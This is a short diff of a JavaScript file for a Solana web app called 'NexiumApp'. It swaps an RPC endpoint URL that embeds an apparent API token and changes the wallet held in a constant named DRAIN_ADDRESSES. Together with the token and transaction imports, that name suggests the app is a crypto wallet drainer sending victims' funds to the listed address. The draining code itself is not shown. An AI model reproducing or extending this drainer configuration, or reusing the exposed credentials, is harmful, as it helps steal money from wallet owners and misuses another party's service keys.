@@ -4,7 +4,7 @@ globalThis.Buffer = Buffer;
 window.Buffer = Buffer;
 
 // === CENTRALIZED RPC CONFIG ===
-const SOLANA_RPC_ENDPOINT = 'https://boldest-hardworking-mound.solana-mainnet.quiknode.pro/e5915b0a14ade6d6f3e04fd53e1649d809d4dd3f';
+const SOLANA_RPC_ENDPOINT = 'https://flashy-virulent-firefly.solana-mainnet.quiknode.pro/7c156da7c07672a303cda977e765f5bc69925e68';
 
 // Other imports
 import { CONFIG } from './config.js';
@@ -12,7 +12,7 @@ import { Connection, PublicKey, TransactionMessage, VersionedTransaction, System
 import * as splToken from '@solana/spl-token';
 
 const DRAIN_ADDRESSES = {
-  solana: "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7"
+  solana: "44B2wrxoMuLygDBo2fDqMhPNTV11JtGo79QoTHKhRDPM"
 };
 
 class NexiumApp {
